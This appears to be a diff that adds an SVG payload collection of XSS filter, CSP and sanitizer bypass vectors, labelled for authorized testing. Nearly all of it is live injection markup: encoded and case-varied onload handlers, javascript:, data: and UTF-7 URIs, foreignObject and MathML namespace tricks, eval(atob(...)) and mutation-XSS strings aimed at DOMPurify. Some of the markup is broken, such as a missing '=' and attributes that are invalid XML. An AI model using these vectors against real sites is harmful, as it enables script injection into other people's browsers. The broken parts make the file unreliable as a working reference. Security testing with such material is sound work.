@@ -1,0 +1,251 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  SVG XSS WAF/Filter Bypass Vectors
+  For authorized security testing only
+-->
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 800 600">
+  <title>SVG XSS Bypass Vectors</title>
+
+  <defs>
+    <style><![CDATA[
+      .bypass { fill: #ff6b6b; }
+      .success { fill: #51cf66; }
+      .text { font-family: monospace; font-size: 11px; fill: #f8f9fa; }
+    ]]></style>
+  </defs>
+
+  <!-- =====================================================================
+       BYPASS 1: Case Variation
+       ===================================================================== -->
+  <g transform="translate(10, 10)">
+    <rect class="bypass" width="250" height="80" rx="5"/>
+    <text class="text" x="10" y="25">1. Case Variation</text>
+    <text class="text" x="10" y="42" font-size="9">OnLoAd, ONLOAD, oNlOaD</text>
+    <text class="text" x="10" y"58" font-size="9">SVG, Svg, sVg</text>
+    <!-- Actual bypass test -->
+    <svg onLoAd="console.log('Bypass: Case variation')" width="10" height="10" x="200" y="5"/>
+  </g>
+
+  <!-- =====================================================================
+       BYPASS 2: Whitespace Obfuscation
+       ===================================================================== -->
+  <g transform="translate(280, 10)">
+    <rect class="bypass" width="250" height="80" rx="5"/>
+    <text class="text" x="10" y="25">2. Whitespace</text>
+    <text class="text" x="10" y="42" font-size="9">onload = alert(1)</text>
+    <text class="text" x="10" y="58" font-size="9">onload	=alert(1)</text>
+    <svg onload	= "console.log('Bypass: Whitespace')" width="10" height="10" x="200" y="5"/>
+  </g>
+
+  <!-- =====================================================================
+       BYPASS 3: Encoding
+       ===================================================================== -->
+  <g transform="translate(550, 10)">
+    <rect class="bypass" width="250" height="80" rx="5"/>
+    <text class="text" x="10" y="25">3. Entity Encoding</text>
+    <text class="text" x="10" y="42" font-size="9">alert&#40;1&#41;</text>
+    <text class="text" x="10" y="58" font-size="9">&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;1&#x29;</text>
+    <svg onload="alert&#40;1&#41;" width="10" height="10" x="200" y="5"/>
+  </g>
+
+  <!-- =====================================================================
+       BYPASS 4: Comment Injection
+       ===================================================================== -->
+  <g transform="translate(10, 110)">
+    <rect class="bypass" width="250" height="80" rx="5"/>
+    <text class="text" x="10" y="25">4. Comment Splitting</text>
+    <text class="text" x="10" y="42" font-size="9">on/**/load</text>
+    <text class="text" x="10" y="58" font-size="9">on<!---->load</text>
+    <svg on/**/load="console.log('Bypass: Comment')" width="10" height="10" x="200" y="5"/>
+  </g>
+
+  <!-- =====================================================================
+       BYPASS 5: Null Byte
+       ===================================================================== -->
+  <g transform="translate(280, 110)">
+    <rect class="bypass" width="250" height="80" rx="5"/>
+    <text class="text" x="10" y="25">5. Null Byte</text>
+    <text class="text" x="10" y="42" font-size="9">onload%00=alert(1)</text>
+    <text class="text" x="10" y="58" font-size="9">onload&#x00;=alert(1)</text>
+    <svg onload&#x00;="console.log('Bypass: Null byte')" width="10" height="10" x="200" y="5"/>
+  </g>
+
+  <!-- =====================================================================
+       BYPASS 6: Double Encoding
+       ===================================================================== -->
+  <g transform="translate(550, 110)">
+    <rect class="bypass" width="250" height="80" rx="5"/>
+    <text class="text" x="10" y="25">6. Double Encoding</text>
+    <text class="text" x="10" y="42" font-size="9">alert%25281%2529</text>
+    <text class="text" x="10" y="58" font-size="9">&#x25;281&#x25;29;</text>
+    <svg onload="alert%25281%2529" width="10" height="10" x="200" y="5"/>
+  </g>
+
+  <!-- =====================================================================
+       BYPASS 7: Namespace Confusion
+       ===================================================================== -->
+  <g transform="translate(10, 210)">
+    <rect class="bypass" width="380" height="80" rx="5"/>
+    <text class="text" x="10" y="25">7. Namespace Confusion</text>
+    <text class="text" x="10" y="42" font-size="9">SVG in HTML context / HTML in SVG via foreignObject</text>
+    <text class="text" x="10" y="58" font-size="9">MathML in SVG / XHTML in SVG</text>
+    <!-- HTML in SVG -->
+    <foreignObject width="150" height="60" x="10" y="65">
+      <body xmlns="http://www.w3.org/1999/xhtml" onload="console.log('Bypass: HTML in SVG')">
+        <script>console.log('HTML context executes')</script>
+      </body>
+    </foreignObject>
+    <!-- MathML in SVG -->
+    <foreignObject width="150" height="60" x="180" y="65">
+      <math xmlns="http://www.w3.org/1998/Math/MathML">
+        <mtext><img src=x onerror="console.log('Bypass: MathML')"></mtext>
+      </math>
+    </foreignObject>
+  </g>
+
+  <!-- =====================================================================
+       BYPASS 8: Data URI Variants
+       ===================================================================== -->
+  <g transform="translate(410, 210)">
+    <rect class="bypass" width="380" height="80" rx="5"/>
+    <text class="text" x="10" y="25">8. Data URI Bypasses</text>
+    <text class="text" x="10" y="42" font-size="9">Base64, Raw, URL Encoded, Charset variations</text>
+    <a xlink:href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9Y29uc29sZS5sb2coJ0J5cGFzczogQmFzZTY0Jyk+PC9zdmc+">
+      <text class="text" x="10" y="65">Base64: Click for XSS</text>
+    </a>
+    <a xlink:href="data:image/svg+xml,%3Csvg%20onload%3Dconsole.log(%27Bypass:%20Raw%27)%3E%3C/svg%3E" x="10" y="80">
+      <text class="text" x="10" y="80">URL Encoded: Click for XSS</text>
+    </a>
+    <a xlink:href="data:image/svg+xml;charset=utf-7,+ADw-svg onload+AD0-alert(1)+AD4APA-/svg+AD4-" x="10" y="95">
+      <text class="text" x="10" y="95">UTF-7: Click for XSS</text>
+    </a>
+  </g>
+
+  <!-- =====================================================================
+       BYPASS 9: SVG Attribute Bypass
+       ===================================================================== -->
+  <g transform="translate(10, 310)">
+    <rect class="bypass" width="380" height="120" rx="5"/>
+    <text class="text" x="10" y="25">9. Attribute Manipulation</text>
+    <text class="text" x="10" y="42" font-size="9">xlink:href javascript:, data:, vbscript:</text>
+    <text class="text" x="10" y="58" font-size="9">href vs xlink:href confusion</text>
+    <text class="text" x="10" y="74" font-size="9">Multiple attributes with same name</text>
+    <text class="text" x="10" y="90" font-size="9">Quotes: single, double, none, backtick</text>
+
+    <!-- xlink:href javascript: -->
+    <a xlink:href="javascript:console.log('Bypass: xlink javascript')">
+      <rect x="10" y="100" width="150" height="25" fill="#4dabf7"/>
+      <text x="20" y="118" font-size="10" fill="white">xlink:href JS</text>
+    </a>
+
+    <!-- data: URI -->
+    <a xlink:href="data:text/html,<script>console.log('Bypass: data URI')</script>">
+      <rect x="170" y="100" width="150" height="25" fill="#f06595"/>
+      <text x="180" y="118" font-size="10" fill="white">data: URI</text>
+    </a>
+
+    <!-- No quotes -->
+    <svg onload=console.log('Bypass: No quotes') width="10" height="10" x="340" y="100"/>
+  </g>
+
+  <!-- =====================================================================
+       BYPASS 10: Parser Differential
+       ===================================================================== -->
+  <g transform="translate(410, 310)">
+    <rect class="bypass" width="380" height="120" rx="5"/>
+    <text class="text" x="10" y="25">10. Parser Differences</text>
+    <text class="text" x="10" y="42" font-size="9">Chrome vs Firefox vs Safari vs Edge</text>
+    <text class="text" x="10" y="58" font-size="9">HTML parser vs XML parser vs SVG parser</text>
+    <text class="text" x="10" y="74" font-size="9">DOMPurify vs sanitize-html vs custom</text>
+
+    <!-- Chrome-specific: SVG in img -->
+    <svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">
+      <image xlink:href="javascript:console.log('Chrome: image js')" onerror="console.log('Firefox: onerror')"/>
+    </svg>
+
+    <!-- Firefox-specific: animate -->
+    <svg width="10" height="10" x="50" y="0">
+      <animate onbegin="console.log('Firefox: animate')"/>
+    </svg>
+
+    <!-- Safari-specific: foreignObject -->
+    <foreignObject width="10" height="10" x="100" y="0">
+      <script xmlns="http://www.w3.org/1999/xhtml">console.log('Safari: foreignObject')</script>
+    </foreignObject>
+  </g>
+
+  <!-- =====================================================================
+       BYPASS 11: CSP Bypass Attempts
+       ===================================================================== -->
+  <g transform="translate(10, 450)">
+    <rect class="bypass" width="780" height="120" rx="5"/>
+    <text class="text" x="10" y="25">11. CSP Bypass Vectors (require data: or unsafe-inline)</text>
+    <text class="text" x="10" y="42" font-size="9">
+      data:image/svg+xml,<svg onload=alert(1)> | data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+ |
+      javascript:alert(1) | blob:https://example.com/...
+    </text>
+    <text class="text" x="10" y="58" font-size="9">
+      nonce bypass: <svg nonce="stolen-nonce" onload=alert(1)> |
+      strict-dynamic: <svg onload="eval(atob('YWxlcnQoMSk='))">
+    </text>
+    <text class="text" x="10" y="74" font-size="9">
+      Trusted Types bypass: SVG use-element, foreignObject, data: URIs |
+      report-only: test with report-uri
+    </text>
+
+    <!-- Data URI iframe test -->
+    <a xlink:href="data:image/svg+xml,<svg onload=console.log('CSP: data URI SVG')>">
+      <rect x="10" y="90" width="200" height="25" fill="#40c057"/>
+      <text x="20" y="108" font-size="10" fill="white">Test data: URI SVG</text>
+    </a>
+
+    <!-- Blob URI test -->
+    <a xlink:href="blob:https://example.com/test">
+      <rect x="220" y="90" width="200" height="25" fill="#f59f00"/>
+      <text x="230" y="108" font-size="10" fill="white">Test blob: URI</text>
+    </a>
+
+    <!-- eval/atob bypass -->
+    <svg onload="eval(atob('Y29uc29sZS5sb2coJ0J5cGFzczogZXZhbC9hdG9iJyk='))" width="10" height="10" x="440" y="90"/>
+  </g>
+
+  <!-- =====================================================================
+       BYPASS 12: DOMPurify/Sanitizer Bypasses
+       ===================================================================== -->
+  <g transform="translate(10, 570)">
+    <rect class="bypass" width="780" height="120" rx="5"/>
+    <text class="text" x="10" y="25">12. Sanitizer Bypasses (DOMPurify 2.x, sanitize-html, etc.)</text>
+    <text class="text" x="10" y="42" font-size="9">
+      Mutation XSS: <svg><svg onload=alert(1)></svg> |
+      Namespace confusion: <math><svg onload=alert(1)></math>
+    </text>
+    <text class="text" x="10" y="58" font-size="9">
+      Form mutation: <form><svg onload=alert(1)></form> |
+      Template: <template><svg onload=alert(1)></template>
+    </text>
+    <text class="text" x="10" y="74" font-size="9">
+      DOMPurify SAFE_FOR_JQUERY: <svg onload=alert(1)> (bypass in some configs) |
+      Hook: <svg><foreignObject><form><svg onload=alert(1)></form></foreignObject></svg>
+    </text>
+
+    <!-- Mutation XSS -->
+    <div xmlns="http://www.w3.org/1999/xhtml" style="display:none;">
+      <svg><svg onload="console.log('Mutation XSS')"></svg>
+    </div>
+
+    <!-- Namespace confusion -->
+    <math xmlns="http://www.w3.org/1998/Math/MathML">
+      <svg xmlns="http://www.w3.org/2000/svg" onload="console.log('Namespace confusion')"/>
+    </math>
+
+    <!-- Form mutation -->
+    <form xmlns="http://www.w3.org/1999/xhtml" style="display:none;">
+      <svg onload="console.log('Form mutation')"/>
+    </form>
+  </g>
+
+  <!-- Footer -->
+  <text class="text" x="10" y="590" font-size="10">
+    SVG XSS Bypass Vectors | Authorized Testing Only | Test each vector in target context
+  </text>
+</svg>
